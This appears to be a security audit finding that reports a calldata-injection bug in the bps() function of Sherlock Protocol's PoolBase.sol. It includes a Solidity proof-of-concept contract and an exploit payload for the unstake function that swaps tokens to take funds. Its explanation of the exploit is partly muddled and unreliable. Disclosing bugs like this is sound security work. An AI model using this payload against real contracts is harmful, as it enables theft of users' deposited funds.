# Handle  hrkrshnn   # Vulnerability details  ## A critical bug in bps function: PoolBase.sol  ``` solidity function bps() internal pure returns (IERC20 rt) {   // These fields are not accessible from assembly   bytes memory array = msg.data;   uint256 index = msg.data.length;    // solhint-disable-next-line no-inline-assembly   assembly {     // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.     rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)   } } ```  The above function is designed to expect the token at the end of `calldata`, but a malicious user can inject extra values at the end of `calldata` and fake return values.  The following contract demonstrates an example:  ``` solidity pragma solidity 0.8.6;  interface IERC20 {}  error StaticCallFailed();  contract BadEncoding {     /// Will return address(1). But address(0) is expected!     function f() external view returns (address) {         address actual = address(0);         address injected = address(1);          (bool success, bytes memory ret) = address(this).staticcall(abi.encodeWithSelector(this.g.selector, actual, injected));          if (!success) revert StaticCallFailed();          return abi.decode(ret, (address));     }     function g(IERC20 _token) external pure returns (IERC20) {         // to get rid of the unused warning         _token;         // Does it always match _token?         return bps();     }     // From Sherlock Protocol: PoolBase.sol     function bps() internal pure returns (IERC20 rt) {         // These fields are not accessible from assembly         bytes memory array = msg.data;         uint256 index = msg.data.length;          // solhint-disable-next-line no-inline-assembly         assembly {             // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.             rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)         }     } } ```  ### An example exploit  This can be used to exploit the protocol:  ``` solidity function unstake(   uint256 _id,   address _receiver,   IERC20 _token ) external override returns (uint256 amount) {   PoolStorage.Base storage ps = baseData();   require(_receiver != address(0), 'RECEIVER');   GovStorage.Base storage gs = GovStorage.gs();   PoolStorage.UnstakeEntry memory withdraw = ps.unstakeEntries[msg.sender][_id];   require(withdraw.blockInitiated != 0, 'WITHDRAW_NOT_ACTIVE');   // period is including   require(withdraw.blockInitiated + gs.unstakeCooldown < uint40(block.number), 'COOLDOWN_ACTIVE');   require(     withdraw.blockInitiated + gs.unstakeCooldown + gs.unstakeWindow >= uint40(block.number),     'UNSTAKE_WINDOW_EXPIRED'   );   amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());    ps.stakeBalance = ps.stakeBalance.sub(amount);   delete ps.unstakeEntries[msg.sender][_id];   ps.lockToken.burn(address(this), withdraw.lock);   _token.safeTransfer(_receiver, amount); } ```  State token `Token1`. Let's say there is a more expensive token `Token2`.  Here's an example exploit:  ``` solidity bytes memory exploitPayload = abi.encodeWithSignature(     PoolBase.unstake.selector,     (uint256(_id), address(_receiver), address(Token2), address(Token1)) ); poolAddress.call(exploitPayload); ```  All the calculations on `ps` would be done on `Token2`, but at the end, because of, `_token.safeTransfer(_receiver, amount);`, `Token2` would be transferred. Assuming that `Token2` is more expensive than `Token1`, the attacker makes a profit.  Similarly, the same technique can be used at a lot of other places. Even if this exploit is not profitable, the fact that the computations can be done on two different tokens is buggy.  There are several other places where the same pattern is used. All of them needs to be fixed. I've not written an exhaustive list.
